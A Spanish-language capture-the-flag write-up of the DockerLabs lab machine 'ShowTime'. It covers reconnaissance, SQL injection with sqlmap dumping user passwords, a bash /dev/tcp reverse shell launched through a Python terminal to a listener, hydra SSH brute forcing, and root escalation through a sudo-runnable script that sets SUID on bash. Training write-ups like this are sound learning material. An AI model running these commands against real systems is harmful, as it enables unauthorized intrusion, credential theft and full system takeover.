---
title: ShowTime - DockerLabs
published: true
categories: DockerLabs
---


| OS     | Dificultad  | Creator           |
| ------ | ----------- | -------------     | 
| Linux  |  Fácil      | maciiii___        | 


# Reconocimiento

Comenzamos el proceso de reconocimiento identificando los puertos abiertos en el sistema objetivo. 
```shell
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG ports 
```
-  `-p-`: Escanea todos los puertos (1-65535).
- `--open`: Solo muestra los puertos abiertos.
- `-sS`: Realiza un escaneo SYN, que es rápido y discreto.
- `--min-rate=5000`: Envía al menos 5000 paquetes por segundo, acelerando el escaneo.
- `-n`: No realiza resolución DNS.
- `-Pn`: No realiza ping previo para determinar si el host está activo.
- `-vvv`: Muestra resultados detallados y en tiempo real.

![image](https://github.com/user-attachments/assets/bbac4d0b-be5f-47eb-b440-77de77cb249c)

Durante el escaneo, descubrimos que los siguientes puertos están activos:
- `22` (SSH)
- `80` (HTTP)
A continuación, evaluamos si los puertos abiertos presentan alguna vulnerabilidad, además de obtener más información sobre los servicios asociados a esos puertos.

```bash
nmap -p22,80 -sCV 172.17.0.2 -oG targeted
```
![image](https://github.com/user-attachments/assets/5d5636f1-24fa-4a1e-a2f9-f58283e6b05c)

# Exploración Web
Al navegar al puerto `80`, encontramos una página la cual parece ser un casino, el cual se puede observar un panel de login.

![image](https://github.com/user-attachments/assets/8b0a912b-2560-4ab2-bdff-a13a3aa270a7)

Utilizamos `Gobuster` para realizar un reconocimiento web y explorar los directorios disponibles en el sitio.
```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,doc,html,txt,img
```
- `gobuster dir` - Indica que estás utilizando la herramienta Gobuster para realizar un escaneo de directorios.
- `-u http://172.17.0.2/` Especifica la URL objetivo que deseas escanear en busca de directorios.
- `-w` Especifica que diccionario queremos usar
- `-x` Para indicar que tipo de extension queremos que nos encuentre

![image](https://github.com/user-attachments/assets/c3203ae4-dff2-4938-a70c-28346f56dc1d)

No encontramos nada interesante, asi que accedemos al apartado de login a ver si podemos hacer inyeccion.

## Inyeccion SQL

Para ello usaremos `sqlmap`, pero antes de ello haremos una prueba basica por si lo detecta sin necesidad de `slmap`.

```SQL
' UNION ORDER BY 1 -- -
```
![image](https://github.com/user-attachments/assets/fa7af2ce-2a6c-477e-9878-f1f9491540be)

Parece que no ha dado un error de mysql, por lo que podemos hacer inyeccion sql para hacerlo mas rapido usaremos , `sqlmap`.

![image](https://github.com/user-attachments/assets/39d2c2e8-5e90-4658-8a11-ad52451f197e)

Usaremos `burpsuite` para guardar la peticion con la extensio `.req`.

![image](https://github.com/user-attachments/assets/96c0bb58-a37e-4863-9dc3-cf1144b29567)

Ahora ejecutaremos los siguiente comandos.

Ver bases de datos
```bash
sqlmap -u "http://172.17.0.2/login_page/index.php" --forms --batch --db
```
```sql
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
[*] users
```
Ver tablas
```bash
sqlmap -u "http://172.17.0.2/login_page/index.php" --forms --batch -D users --tables
```
```sql
Database: users
[1 table]
+----------+
| usuarios |
+----------+
```
Usuarios y contraseñas
```bash
sqlmap -u "http://172.17.0.2/login_page/index.php" --forms --batch -D users -T usuarios --dump
```
```sql
Database: users
Table: usuarios
[3 entries]
+----+----------------------+----------+
| id | password             | username |
+----+----------------------+----------+
| 1  | 123321123321         | lucas    |
| 2  | 123456123456         | santiago |
| 3  | MiClaveEsInhackeable | joe      |
+----+----------------------+----------+
```

# ReverseShell

Con el usuario `joe` hacemos login y nos encontramos una terminal de python que nos permite ejecutar comandos.

![image](https://github.com/user-attachments/assets/36497382-dd84-4867-b696-3f949796e278)

Vamos a generar una reverseshell

```bash
import os; os.system('/bin/bash -c "bash -i >& /dev/tcp/172.17.0.1/4444 0>&1"')
```
Simultaneamente nos ponemos en modo escucha con `netcat`.

```bash
nc -lvnp 4444
```

![image](https://github.com/user-attachments/assets/d884c6a8-6a34-4310-a536-b651fd4a1877)

## TTY ReverseShell

### Iniciar una sesión de shell interactiva
En nuestra shell básica, ejecutamos el siguiente comando para forzar la creación de una sesión de bash interactiva:
```bash
script /dev/null -c bash
```
### Suspender la shell
Una vez que el comando anterior está en ejecución, utilizamos
```bash
Control+Z
```
para suspender temporalmente nuestra shell.

### Preparar nuestro terminal local:
Antes de volver a nuestra shell, configuramos nuestro terminal local:
```bash
stty raw -echo; fg
```

### Resetear la configuración del terminal
Ahora que tenemos el control de la shell, la reseteamos para asegurar que se comporta correctamente:
```bash
reset
```

### Configura el tipo de terminal:
```bash
xterm
export TERM=xterm
export SHELL=bash
```

# Intrusion 

Ya hemos accedido con el usuario `www-data.`
![image](https://github.com/user-attachments/assets/69994322-b285-41d8-b698-85dd31243cac)

Haciendo un poco de enumeracion vemos que el directorio /tmp tiene archivos ocultos.

![image](https://github.com/user-attachments/assets/008f1e8e-8b6c-42b6-a11e-8063182a49e2)

Parece un monton de posibilidades de contrseñas para usuarios.

![image](https://github.com/user-attachments/assets/8586f001-8ce1-41db-8b73-8dec3dd63bc7)

Vamos a probarlo con el usuario `luciano` y con `joe `con la herramienta hydra.

![image](https://github.com/user-attachments/assets/94892aae-cd20-4fc2-803e-89c0b6b01da9)

Al probar no obtenemos nada, por lo que vamos a porbar a poner todas las contraseñas en miusculas.

```bash
tr "A-Z" "a-z" < ./.hidden_text.txt > minusculas.txt
```

Ahora los vamos a pasar a nuestra maquina lo podeis hacerlo tanto copiarlo todo el contenido y pegandolo a un nuevo archivo o a traves de un servidor por http con python.

![image](https://github.com/user-attachments/assets/a599fd25-46f8-40bc-b805-943f55a4e521)

Ya que tenemos el archivo vamos a volver a probar con `hydra`.
```bash
hydra -l luciano -P minusculas.txt  ssh://172.17.0.2
```
![image](https://github.com/user-attachments/assets/f6c6054a-c648-4d78-b886-0eec54f55aca)

Parece que con luciano no ha encontrado nada ahora porbaremos con `joe`.
```bash
hydra -l joe -P minusculas.txt  ssh://172.17.0.2 -t 64
```
![image](https://github.com/user-attachments/assets/f5a10598-6755-4ce3-a9f9-5d22c0c58b02)

Ya tenemos la contraseña la cual es `chittychittybangbang`.

# Intrusion con joe

Accedemos con ssh
```bash
ssh joe@172.17.0.2
```
![image](https://github.com/user-attachments/assets/2db2081f-3201-4d2b-b797-318ecbe98de7)

Al ejecutar `sudo -l`, notamos que tiene permisos para ejecutar `posh` como `luciano`.Utilizando [GTFOBins](https://gtfobins.github.io/gtfobins/awk/#shell) sabemos cómo explotar estos binarios.

![image](https://github.com/user-attachments/assets/c9cd0c6d-345e-48be-8b6b-2e75bd17a809)

#Escalada de privilegios

```bash
sudo -u luciano /bin/posh
```
![image](https://github.com/user-attachments/assets/a2d8b149-045a-4c40-b37a-90b908e77b51)

Al ejecutar `sudo -l`, notamos que tiene permisos para ejecutar `bash` como `root` a `/home/luciano/script.sh`.Utilizando [GTFOBins](https://gtfobins.github.io/gtfobins/awk/#shell) sabemos cómo explotar estos binarios.

![image](https://github.com/user-attachments/assets/6b8612b6-6fc7-4147-bae2-2a2be1770bb2)

Vemos si tenemos permisos , y parece que podemos modificar el archivo por lo que modificaremos el archivo.

![image](https://github.com/user-attachments/assets/5e22ce57-55d0-49bb-853f-ac80e9c9c779)

Parece que no tenemos ni `nano` ni `vim` por lo que lo haremos de la siguiente manera.

![image](https://github.com/user-attachments/assets/7e0ee8e0-be64-4ad7-80ae-7eee55b662d6)

Con echo añadiremos las siguientes lineas.

```bash
echo " " > script.sh 
echo '#!/bin/bash' > script.sh 
echo 'chmod u+s /bin/bash' >> script.sh 
```

![image](https://github.com/user-attachments/assets/38f1f07f-2be9-4901-8341-91298ed34f3e)

Ahora ehecutamos el script con root.

```bash
sudo -u root /bin/bash /home/luciano/script.sh
bash -p
```

Y ya somo root

![image](https://github.com/user-attachments/assets/7f824158-6956-422c-989c-cb1471521064)



